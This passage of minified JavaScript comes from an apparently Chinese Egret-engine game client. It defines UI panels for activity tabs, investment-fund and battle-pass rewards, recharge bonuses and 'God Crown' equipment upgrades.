i=o.GlobalConfig.ActivityBtnConfig[t.activityID].sort,n=o.GlobalConfig.ActivityBtnConfig[e.activityID].sort;return i>n?1:n>i?-1:0});for(var u=0;u<i.length;u++)this.eVs.addChild(i[u]);this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.initSelected=function(){return 0},e.prototype.tabRp=function(){var t;if(window.platform.isshen())return!1;var e=s.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(a.Activity3PageStyle.Activity2==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},__decorate([delayCall(1e3)],e.prototype,"updateTabRp",null),e}(n.BaseView);e.FuliMain3=l,window.FuliMain3=l,__reflect(l.prototype,"FuliMain3",[]),window.FuliMain3=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliMain4=void 0;var n=i(1),o=i(0),s=i(9),a=i(56),r=i(29),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliMain4Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t){observe(this,this.updateTabRp,s.Activity.ins().postChangePage,s.Activity.ins().postRewardResult),this.initTab()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=s.Activity.ins().activityData,e=Object.keys(t);if(!e.length)return!1;var i=[];for(var n in t){var l=t[n];if(a.Activity4PageStyle.Activity4==l.pageStyle){if(!l.isOpenActivity()||l.getHide())continue;var h=r.ActivityPanel.create(l.id,l.type);if(!h)continue;h.name=o.GlobalConfig.ActivityBtnConfig[l.id].title||"",h.visible=!1,h.horizontalCenter="0",h.top="0",h.bottom="0",i.push(h)}}i.sort(function(t,e){var i=o.GlobalConfig.ActivityBtnConfig[t.activityID].sort,n=o.GlobalConfig.ActivityBtnConfig[e.activityID].sort;return i>n?1:n>i?-1:0});for(var u=0;u<i.length;u++)this.eVs.addChild(i[u]);this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initSelected=function(){return 0},e.prototype.tabRp=function(){var t;if(window.platform.isshen())return!1;var e=s.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(a.Activity4PageStyle.Activity4==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},__decorate([delayCall(1e3)],e.prototype,"updateTabRp",null),e}(n.BaseView);e.FuliMain4=l,window.FuliMain4=l,__reflect(l.prototype,"FuliMain4",[]),window.FuliMain4=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliMain5=void 0;var n=i(1),o=i(17),s=i(0),a=i(9),r=i(56),l=i(29),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliMain5Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t){observe(this,this.updateTabRp,o.RedPointBaseSys.ins().RpChange),this.initTab()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=a.Activity.ins().activityData,e=Object.keys(t);if(!e.length)return!1;var i=[];for(var n in t){var o=t[n];if(r.Activity5PageStyle.Activity5==o.pageStyle){if(!o.isOpenActivity()||o.getHide())continue;var h=l.ActivityPanel.create(o.id,o.type);if(!h)continue;h.name=s.GlobalConfig.ActivityBtnConfig[o.id].title||"",h.visible=!1,h.horizontalCenter="0",h.top="0",h.bottom="0",i.push(h)}}i.sort(function(t,e){var i=s.GlobalConfig.ActivityBtnConfig[t.activityID].sort,n=s.GlobalConfig.ActivityBtnConfig[e.activityID].sort;return i>n?1:n>i?-1:0});for(var u=0;u<i.length;u++)this.eVs.addChild(i[u]);this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.initSelected=function(){return 0},e.prototype.tabRp=function(){var t;if(window.platform.isshen())return!1;var e=a.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(r.Activity5PageStyle.Activity5==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(n.BaseView);e.FuliMain5=h,window.FuliMain5=h,__reflect(h.prototype,"FuliMain5",[]),window.FuliMain5=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Panel28=void 0;var n=i(24),o=i(66),s=i(5),a=i(1),r=i(0),l=i(25),h=i(35),u=i(2),p=i(9),d=i(253),c=function(t){function e(){var e=t.call(this)||this;return e.cfgIndex=28,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.dailyReward.itemRenderer=d.OSATarget41Item28,this.dailyReward.dataProvider=this.listDP,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,h.TaskCT.ins().postInvestmentTaskData),observe(this,this.update,p.Activity.ins().postActivityIsGetAwards);r.GlobalConfig.ActivityType41Config[this.cfgIndex];this.desc1.textFlow=s.TextFlowMaker.generateTextFlow(gettext("豪华版基金|C:0x40df38&T:13倍返利|, ")),this.desc2.textFlow=s.TextFlowMaker.generateTextFlow(gettext("总共返还|C:0xbd600d&T:12980|元宝")),this.update()},e.prototype.update=function(){this.data=p.Activity.ins().activityData[this.cfgIndex],this.updateView()},e.prototype.updateView=function(){var t=r.GlobalConfig.ActivityType41Config[this.cfgIndex],e=n.CommonUtils.objectToArray(r.GlobalConfig.InvestmentTaskConfig[t.taskid]);this.listDP.replaceAll(e);var i=l.Recharge.ins().getCashByRid(t.rid)/100;this.eBtn.label=o.PayUtils.getPayUnitStr(i,urlParam.payUnit),this.eBtn.visible=!(this.data&&this.data.hasBuy)},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:var e=r.GlobalConfig.ActivityType41Config[this.cfgIndex];if(urlParam.appid){var i=r.GlobalConfig.ActivityConfig[this.activityID];if(i&&i.onlyappid){var n=!1;for(var o in i.onlyappid)urlParam.appid==i.onlyappid[o]&&(n=!0);if(!n)return void(i.onlyappidTip?u.TipsCT.ins().showTips(i.onlyappidTip):u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}l.Recharge.ins().sendPayOrder(e.rid)}},e.prototype.openCheck=function(){return this.data?!0:!1},e.prototype.tabRp=function(){return h.TaskCT.ins().jijinRed.v},__decorate([delayCall()],e.prototype,"update",null),e}(a.BaseView);e.OSATarget41Panel28=c,window.OSATarget41Panel28=c,__reflect(c.prototype,"OSATarget41Panel28",[]),window.OSATarget41Panel28=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Panel27=void 0;var n=i(8),o=i(1),s=i(0),a=i(7),r=i(35),l=i(9),h=i(410),u=function(t){function e(){var e=t.call(this)||this;return e.cfgIndex=27,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.dailyReward.itemRenderer=h.OSATarget41Item27,this.dailyReward.dataProvider=this.listDP=new eui.ArrayCollection([]),this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,r.TaskCT.ins().postInvestmentTaskData),observe(this,this.update,l.Activity.ins().postActivityIsGetAwards),this.update()},e.prototype.update=function(){this.data=l.Activity.ins().activityData[this.cfgIndex],this.updateView()},e.prototype.updateView=function(){var t=s.GlobalConfig.ActivityType41Config[this.cfgIndex],e=s.GlobalConfig.InvestmentTaskConfig[t.taskid],i=[];for(var n in e)i.push(e[n]);this.listDP.replaceAll(i),this.updateResetTime()},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:var e=s.GlobalConfig.ActivityType41Config[this.cfgIndex];win.open("OSAZhanlingTipPanel",e.rid)}},e.prototype.openCheck=function(){return this.data?!0:!1},e.prototype.tabRp=function(){return r.TaskCT.ins().zhanlingRed.v},e.prototype.enterFrame=function(){this.updateResetTime()},e.prototype.updateResetTime=function(){if(this.data){var t=this.data.resetms-a.GameServerCC.serverTime;t=t>0?t:0,this.lbResetTime.visible=t>0;var e=n.DateUtils.getFormatBySecond(Math.floor(t/1e3),n.DateUtils.TIME_FORMAT_1);this.lbResetTime.text=gettext("战令将于 {0}后重置",e)}},__decorate([delayCall()],e.prototype,"update",null),__decorate([callDelay(1e3)],e.prototype,"enterFrame",null),e}(o.BaseView);e.OSATarget41Panel27=u,window.OSATarget41Panel27=u,__reflect(u.prototype,"OSATarget41Panel27",[]),window.OSATarget41Panel27=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Item27=void 0;var n=i(3),o=i(11),s=i(6),a=i(35),r=i(2),l=i(9),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oData=new eui.ArrayCollection,e.zData=new eui.ArrayCollection,e.lData=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstOrdinary.itemRenderer=o.ItemBase,this.lstZero.itemRenderer=o.ItemBase,this.lstLuxury.itemRenderer=o.ItemBase,this.arc1=new eui.ArrayCollection,this.arc2=new eui.ArrayCollection,this.arc3=new eui.ArrayCollection,this.lstOrdinary.dataProvider=this.arc1,this.lstZero.dataProvider=this.arc2,this.lstLuxury.dataProvider=this.arc3,this.addTouchEvent(this.btnOrdinary,this.onClick),this.addTouchEvent(this.btnZero,this.onClick),this.addTouchEvent(this.btnLuxury,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.arc1.replaceAll(t.freeReward.concat()),this.arc2.replaceAll(t.yuanbaoReward.concat()),this.arc3.replaceAll(t.reward.concat());var e=a.TaskCT.ins().getInvestmentTask(t.id,t.index),i="";switch(t.type){case 8:i=gettext("{0}级",t.target);break;case 19:i=gettext("{0}转",t.target);break;case 100:i=gettext("第{0}天",t.target)}this.eInfo.text=i;var n=l.Activity.ins().activityData[27];if(e){if((null===n||void 0===n?void 0:n.ybhasBuy)&&0!=e.status?e.pay&&1==e.pay?this.btnZero.currentState="got":this.btnZero.currentState="unLock":this.btnZero.currentState="lock",null===n||void 0===n?void 0:n.hasBuy)switch(e.status){case 0:this.btnLuxury.currentState="lock";break;case 1:this.btnLuxury.currentState="unLock";break;case 2:this.btnLuxury.currentState="got"}else this.btnLuxury.currentState="lock";0!=e.status?e.free&&1==e.free?this.btnOrdinary.currentState="got":this.btnOrdinary.currentState="unLock":this.btnOrdinary.currentState="lock"}}},e.prototype.onClick=function(t){var e=this.data,i=a.TaskCT.ins().getInvestmentTask(e.id,e.index),n=l.Activity.ins().activityData[27];if(!i)return void r.TipsCT.ins().showTips(gettext("未达到任务目标"));switch(t.currentTarget){case this.btnOrdinary:if(0!=i.status)if(i.free&&1==i.free)r.TipsCT.ins().showTips(gettext("免费奖励已领取"));else{var o=s.BagCT.ins().rockonNeedNum(e.freeReward);if(s.BagCT.ins().getAllSurplusCount(o)<=0)return void r.TipsCT.ins().showTips(gettext("背包空间不足请扩容"));a.TaskCT.ins().sendInvestmentTaskData(e.id,e.index,1)}else r.TipsCT.ins().showTips(gettext("未达到任务目标"));break;case this.btnZero:if(null===n||void 0===n?void 0:n.ybhasBuy)if(0!=i.status)if(i.pay&&1==i.pay)r.TipsCT.ins().showTips(gettext("0元购已领取"));else{var o=s.BagCT.ins().rockonNeedNum(e.yuanbaoReward);if(s.BagCT.ins().getAllSurplusCount(o)<=0)return void r.TipsCT.ins().showTips(gettext("背包空间不足请扩容"));a.TaskCT.ins().sendInvestmentTaskData(e.id,e.index,2)}else r.TipsCT.ins().showTips(gettext("未达到任务目标"));else r.TipsCT.ins().showTips(gettext("0元购未开启"));break;case this.btnLuxury:if(null===n||void 0===n?void 0:n.hasBuy)switch(i.status){case 0:r.TipsCT.ins().showTips(gettext("未达到任务目标"));break;case 1:var o=s.BagCT.ins().rockonNeedNum(e.reward);if(o&&s.BagCT.ins().getAllSurplusCount(o)<0)return void r.TipsCT.ins().showTips(gettext("背包空间不足请扩容"));a.TaskCT.ins().sendInvestmentTaskData(e.id,e.index,0);break;case 2:r.TipsCT.ins().showTips(gettext("豪华礼包购已领取"))}else r.TipsCT.ins().showTips(gettext("未购买豪华礼包"))}},e}(n.BaseItemRender);e.OSATarget41Item27=h,window.OSATarget41Item27=h,__reflect(h.prototype,"OSATarget41Item27",[]),window.OSATarget41Item27=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATargetDays42ItemRender2=e.OSATargetDays42ItemRender=e.OSATarget0Panel2=void 0;var n=i(55),o=i(3),s=i(1),a=i(11),r=i(6),l=i(25),h=i(2),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="Days42Recharge",e}return __extends(e,t),e.prototype.skinComplete=function(){t.prototype.childrenCreated.call(this),this.content.itemRenderer=p,this.bigReward.itemRenderer=d},e.prototype.addDisplay=function(){this.content.dataProvider?this.updateData():this.updateList(),this.observe(l.Recharge.ins().postRechargeTotalDay,this.updateData)},e.prototype.updateList=function(){var t=[],e=[],i=l.Recharge.ins().getRechargeList();for(var n in i){var o=i[n];t.push(o),1==o.bigReward&&e.push(o)}t.sort(this.sort),e.sort(this.sort2),this.content.dataProvider=new eui.ArrayCollection(t.splice(0,4)),this.delayUpdate(t),this.bigReward.dataProvider=new eui.ArrayCollection(e)},e.prototype.delayUpdate=function(t){var e=this.content.dataProvider;t.length&&(e.addItem(t.shift()),this.delayUpdate(t))},e.prototype.sort=function(t,e){var i=l.Recharge.ins().rechargeTotal.hasGetDays,o=i.indexOf(t.id),s=i.indexOf(e.id);return o>=0&&0>s?1:0>o&&s>=0?-1:n.Algorithm.sortAsc(t.id,e.id)},e.prototype.sort2=function(t,e){return n.Algorithm.sortAsc(t.id,e.id)},e.prototype.close=function(){this.removeObserve()},e.prototype.updateData=function(){var t=this.content.dataProvider;t.source.sort(this.sort);for(var e=0;e<t.length;e++)console.error("返利数据："+t.getItemAt(e).id),t.itemUpdated(t.getItemAt(e));t=this.bigReward.dataProvider;for(var e=0;e<t.length;e++)console.error("返利大数据："+t.getItemAt(e).id),t.itemUpdated(t.getItemAt(e))},e.prototype.tabRp=function(){return l.Recharge.ins().rpAct0_2.v},e.maxDay=32,e}(s.BaseView);e.OSATarget0Panel2=u,window.OSATarget0Panel2=u,__reflect(u.prototype,"OSATarget0Panel2",[]);var p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this),this.get0.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this),this.rewardList.itemRenderer=a.ItemBase,getLangType()==LanguageEnum.AR&&(this.currentState="ar")},e.prototype.onTap=function(t){return r.BagCT.ins().getAllSurplusCount(1)<0?void h.TipsCT.ins().showTips(gettext("背包已满")):void l.Recharge.ins().getRechargeTotalAward(this.data.id)},e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this);var e=this.data;if(e&&(null===e||void 0===e?void 0:e.id)){var i=e.id;this.num.text=i+"",this.rewardList.dataProvider=new eui.ArrayCollection(e.awardList),l.Recharge.ins().rechargeTotal.hasGetDays.indexOf(e.id)>=0?(this.get0.visible=!1,this.already.visible=!0):(this.get0.visible=!0,this.already.visible=!1,e.id<=l.Recharge.ins().rechargeTotal.totalDay?(this.get0.label=gettext("领取"),this.get0.enabled=!0,this.get0.red.visible=!0):(this.get0.label=gettext("未完成"),this.get0.enabled=!1,this.get0.red.visible=!1))}},e}(o.BaseItemRender);e.OSATargetDays42ItemRender=p,window.OSATargetDays42ItemRender=p,__reflect(p.prototype,"OSATargetDays42ItemRender",[]);var d=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this);var e=this.data;this.days.text="",e.awardList.length>2?this.reward.data=e.awardList[2]:this.reward.data=e.awardList[0];var i=this.data.sum*u.maxDay;l.Recharge.ins().rechargeTotal.hasGetDays.length>=i?this.state.visible=!0:this.state.visible=l.Recharge.ins().rechargeTotal.hasGetDays.indexOf(e.id)>=0},e}(o.BaseItemRender);e.OSATargetDays42ItemRender2=d,window.OSATargetDays42ItemRender2=d,__reflect(d.prototype,"OSATargetDays42ItemRender2",[]),window.OSATargetDays42ItemRender2=d,window.OSATargetDays42ItemRender=p,window.OSATarget0Panel2=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBaseEff6=void 0;var n=i(3),o=i(21),s=i(16),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&(this.item.data=this.data,this.updateSpEffect(),this.updateGetShow())},e.prototype.showSpecialEffect=function(t,e){void 0===e&&(e=!0),this.data&&(this.item.touchChildren=this.eG.touchEnabled=e,t?(this._ffect=this._ffect||new o.MovieClip,this._ffect.parent||this.eG.addChild(this._ffect),this._ffect.playFile(RES_DIR_EFF+"ValueEff2",-1)):this._ffect&&s.DisplayUtils.removeFromParent(this._ffect))},e.prototype.updateSpEffect=function(){this.skin&&this.data&&this.showSpecialEffect(1==this.data.showEff,1==this.data.touchItem)},e.prototype.updateGetShow=function(){this.skin&&this.data&&this.item.getImg&&this.item.setGetImg(1==this.data.showGet)},__decorate([delayCall(200)],e.prototype,"updateGetShow",null),e}(n.BaseItemRender);e.ItemBaseEff6=a,window.ItemBaseEff6=a,__reflect(a.prototype,"ItemBaseEff6",[]),window.ItemBaseEff6=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuncShowItem=void 0;var n=i(5),o=i(3),s=i(84),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this),this.updateView(),this.updateSelect()},e.prototype.updateView=function(){this.data&&this.skin&&(this.curCfg=this.data,this.imgIcon.source=this.curCfg.icon,this.txtName.text=this.curCfg.name,this.txtOpen.textFlow=n.TextFlowMaker.generateTextFlow1(this.curCfg.openLimitTxt),this.updateRed())},e.prototype.updateSelect=function(){this.currentState=this.selected?"selected":"normal"},e.prototype.updateRed=function(){this.data&&this.skin&&(this.eRp.visible=1==s.FuLiCT.ins().getFunsShowAwardById(this.data.id))},e}(o.BaseItemRender);e.FuncShowItem=a,window.FuncShowItem=a,__reflect(a.prototype,"FuncShowItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QingDianMainWin=void 0;var n=i(1),o=i(84),s=i(17),a=i(56),r=i(12),l=i(15),h=i(2),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="QingDianMainSkin",e.evsIdx=0,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=!window.platform.isshen()&&r.OpenSystem.ins().checkSysOpen(l.SystemType.Celebration)&&o.FuLiCT.ins().isHasFuliActivity(a.Activity1001PageStyle);return i||h.TipsCT.ins().showTips(gettext("活动未开启")),i},e.prototype.skinComplete=function(){this.addChangeEvent(this.eTab,this.onTabTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]&&(this.evsIdx=t[0]),this.initTab(),observe(this,this.updateTabRp,s.RedPointBaseSys.ins().RpChange),this.updateTabRp()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){var t=this.eVs.getChildIndex(this.FuliMain1001);t>=0&&(!o.FuLiCT.ins().isHasFuliActivity(a.Activity1001PageStyle)||window.platform.isshen())&&this.eVs.removeChildAt(t),this.eTab.selectedIndex=this.evsIdx,this.eVs.selectedIndex=this.evsIdx,this.eTab.validateNow();var e=this.eTab.getElementAt(this.evsIdx),i=this.eVs.getElementAt(this.evsIdx);e.bg.source=i.tabImg+"1"},e.prototype.onTabTouch=function(){if(this.evsIdx!=this.eTab.selectedIndex){var t=this.eTab.getElementAt(this.evsIdx),e=this.eVs.getElementAt(this.evsIdx);t.bg.source=e.tabImg;var i=this.eTab.getElementAt(this.eTab.selectedIndex),n=this.eVs.getElementAt(this.eTab.selectedIndex);i.bg.source=n.tabImg+"1",this.evsIdx=this.eTab.selectedIndex}},e}(n.BaseView);e.QingDianMainWin=u,window.QingDianMainWin=u,__reflect(u.prototype,"QingDianMainWin",[]),window.QingDianMainWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodCrownComponentPanel=void 0;var n=i(1),o=i(110),s=i(0),a=i(132),r=i(416),l=i(98),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ComponentSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.costCmlist1.itemRenderer=o.CostComRender,this._curCostArr1=new eui.ArrayCollection,this.costCmlist1.dataProvider=this._curCostArr1},e.prototype.addDisplay=function(){observe(this,this.updateSelect,l.GodCrownCT.ins().updateCrownEquipPart),observe(this,this.setInit,l.GodCrownCT.ins().postCrownPartUpDateObserve),observe(this,this.updateSelect,l.GodCrownCT.ins().postCrownPartUpDateObserve),this.addTouchEvent(this,this.onTap);for(var t=1;this["component"+t];)this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this["component"+t]),t++;this.level.text="",this.setInit()},e.prototype.removeDisplay=function(){if(this.skin){this.removeObserve(),this.removeTouchEvent(this,this.onTap);for(var t=1;this["component"+t];)this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this["component"+t]),t++}},e.prototype.onTap=function(t){switch(t.target){case this.upgradeBtn:case this.activateBtn:l.GodCrownCT.ins().sendCrownPartUp(l.GodCrownCT.ins().crownEquip.crownId,l.GodCrownCT.ins().crownEquip.equipId,l.GodCrownCT.ins().crownEquipPart.partId);break;case this.exitBtn:win.close(this)}},e.prototype.setInit=function(){var t=l.GodCrownCT.ins().crownEquip;l.GodCrownCT.ins().nowOpenEquipPartsCount=0;var e=s.GlobalConfig.CrownPartCfg[t.crownId][t.equipId];if(e){for(var i in e)l.GodCrownCT.ins().nowOpenEquipPartsCount++;for(var i=1;i<=l.GodCrownCT.ins().nowOpenEquipPartsCount;i++)this["component"+(+i-1)].data=e[i][1]}this.max.visible=this.costLabel1.visible=this.activateBtn.visible=this.upgradeBtn.visible=!1},e.prototype.onClick=function(t){if(t.target instanceof r.CrownEquipPartItem){var e=t.target;e&&e.onClick()}},e.prototype.updateSelect=function(){for(var t=0;5>=t;t++){var e=this["component"+t];e&&e.updateSelect()}this.setCostValue()},e.prototype.setCostValue=function(){var t=l.GodCrownCT.ins().crownEquipPart,e=l.GodCrownCT.ins().returnPart(t);if(this.max.visible=!1,e){var i=s.GlobalConfig.CrownPartCfg[t.crownId][t.equipId][e.partId][e.partLv+1];if(this.costLabel1.visible=!0,i){this.upgradeBtn.visible=!0,this.activateBtn.visible=!1,l.GodCrownCT.ins().judgeIsCan(i.cost)?this.upgradeBtn.enabled=!0:this.upgradeBtn.enabled=!1;var n=[];for(var o in i.cost)n.push({cost:{type:i.cost[o].type,id:i.cost[o].id,count:i.cost[o].count},isShowHas:!0,isShowXh:!1});this._curCostArr1.source=n,this._curCostArr1.refresh()}else this.costLabel1.visible=!1,this.max.visible=!0,this.upgradeBtn.visible=!1,this.activateBtn.visible=!1;
var r=s.GlobalConfig.CrownPartCfg[t.crownId][t.equipId][e.partId][e.partLv].attr,h=a.NebulaCT.ins().returnAttStr(r);this.nowAttr0.text=h,this.level.text=gettext("{0}级",e.partLv)+s.GlobalConfig.CrownPartCfg[t.crownId][t.equipId][e.partId][e.partLv].partname}else{this.upgradeBtn.visible=!1,this.activateBtn.visible=!0,this.costLabel1.visible=!0;var u=l.GodCrownCT.ins().returnEquipData({crownId:t.crownId,equipId:t.equipId});u.eqQuilty>=t.partId&&l.GodCrownCT.ins().judgeIsCan(t.cost)?this.activateBtn.enabled=!0:this.activateBtn.enabled=!1;var n=[];for(var o in t.cost)n.push({cost:{type:t.cost[o].type,id:t.cost[o].id,count:t.cost[o].count},isShowHas:!0,isShowXh:!1});this._curCostArr1.source=n,this._curCostArr1.refresh(),this.nowAttr0.text="",this.level.text=gettext("未激活")}},e}(n.BaseView);e.GodCrownComponentPanel=h,window.GodCrownComponentPanel=h,__reflect(h.prototype,"GodCrownComponentPanel",[]),window.GodCrownComponentPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrownEquipPartItem=void 0;var n=i(3),o=i(0),s=i(98),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CrownEquipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!0,this.touchChildren=!1,this.rp.visible=!1},e.prototype.dataChanged=function(){var t;if(this.data){var e=this.data,i=s.GodCrownCT.ins().returnPart(e);if(this.equipname.text=e.equipname,this.seclect.visible=!1,i){this.activatable.visible=!1,this.itemicon.visible=this.bg.visible=!0,this.lock.visible=!1,this.itemicon.source=RES_DIR_ITEMICON+e.particon+".png"||!1;var n=o.GlobalConfig.CrownPartCfg[e.crownId][e.equipId][i.partId][i.partLv+1];n&&s.GodCrownCT.ins().judgeIsCan(n.cost)?this.rp.visible=!0:this.rp.visible=!1}else{this.bg.visible=this.lock.visible=!0,this.itemicon.visible=this.rp.visible=!1;var a=s.GodCrownCT.ins().returnEquipData({crownId:e.crownId,equipId:e.equipId});a?a.eqQuilty>=e.partId&&s.GodCrownCT.ins().judgeIsCan(e.cost)?(this.activatable.visible=!0,this.rp.visible=!0):(this.activatable.visible=!1,this.rp.visible=!1):this.rp.visible=!1}this.equipname.text=(null===(t=this.data)||void 0===t?void 0:t.partname)||""}},e.prototype.onClick=function(){s.GodCrownCT.ins().crownEquipPart=this.data,s.GodCrownCT.ins().updateCrownEquipPart()},e.prototype.updateSelect=function(){s.GodCrownCT.ins().crownEquip.crownId==this.data.crownId&&s.GodCrownCT.ins().crownEquip.equipId==this.data.equipId&&s.GodCrownCT.ins().crownEquipPart.partId==this.data.partId?this.seclect.visible=!0:this.seclect.visible=!1},e}(n.BaseItemRender);e.CrownEquipPartItem=a,window.CrownEquipPartItem=a,__reflect(a.prototype,"CrownEquipPartItem",[]),window.CrownEquipPartItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodCrownDetailsPanel=void 0;var n=i(1),o=i(0),s=i(418),a=i(98),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CrownDetailsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=s.CrownDetailsItem,this.eList.dataProvider=this._arrA=new eui.ArrayCollection},e.prototype.addDisplay=function(){var t,e,i,n;a.GodCrownCT.ins().hasActCount=0,a.GodCrownCT.ins().nowShowSkillQ=[],a.GodCrownCT.ins().nowShowAttrQ=[];var s=a.GodCrownCT.ins().GodCrownDadaList,r=o.GlobalConfig.CrownSkillCfg,l=[];if(r)for(var h in s)if(s[h]&&(null===(t=s[h])||void 0===t?void 0:t.eqQuilty)>0&&(null===(e=s[h])||void 0===e?void 0:e.eqCount)>0){var u=r[s[h].crownId];if(u){var p=[],d=s[h].arr0,c=d.length;if(c>0){var f=[];for(var g in u)c>=+g&&f.push(+g);for(var m in f){var v=u[f[m]];for(var y in v){var C=0;for(var T in d)d[T].eqQuilty>=+y&&C++;C>=f[m]&&(p[0]={crownId:s[h].crownId,quality:+y,count:f[m]})}}}if(p.length>0){a.GodCrownCT.ins().hasActCount++;var b=u[p[0].count][p[0].quality];a.GodCrownCT.ins().nowShowSkillQ[p[0].crownId]=p[0].quality,l.push(b)}}}var w=[];for(var T in r)for(var I in r[T])for(var _ in r[T][I]){var S=!1;for(var y in l)l[y].crownId==T&&l[y].equipNum==I&&l[y].equipQuality==_&&(S=!0);S||w.push(r[T][I][_])}var x=o.GlobalConfig.CrownAttrCfg;if(x)for(var h in s)if(s[h]&&(null===(i=s[h])||void 0===i?void 0:i.eqQuilty)>0&&(null===(n=s[h])||void 0===n?void 0:n.eqCount)>0){var u=x[s[h].crownId];if(u){var p=[],d=s[h].arr0,c=d.length;if(c>0){var f=[];for(var g in u)c>=+g&&f.push(+g);for(var m in f){var v=u[f[m]];for(var y in v){var C=0;for(var T in d)d[T].eqQuilty>=+y&&C++;C>=f[m]&&(p[0]={crownId:s[h].crownId,quality:+y,count:f[m]})}}}if(p.length>0){a.GodCrownCT.ins().hasActCount++;var b=u[p[0].count][p[0].quality];a.GodCrownCT.ins().nowShowAttrQ[p[0].crownId]=p[0].quality,l.push(b)}}}for(var T in x)for(var I in x[T])for(var _ in x[T][I]){var S=!1;for(var y in l)l[y].crownId==T&&l[y].partNum==I&&l[y].equipQuality==_&&(S=!0);S||w.push(x[T][I][_])}for(var h in w)l.push(w[h]);this._arrA.replaceAll(l)},e}(n.BaseView);e.GodCrownDetailsPanel=r,window.GodCrownDetailsPanel=r,__reflect(r.prototype,"GodCrownDetailsPanel",[]),window.GodCrownDetailsPanel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrownDetailsItem=void 0;var n=i(49),o=i(5),s=i(3),a=i(0),r=i(31),l=i(10),h=i(65),u=i(98),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CrownDetailsItemSkin",e}return 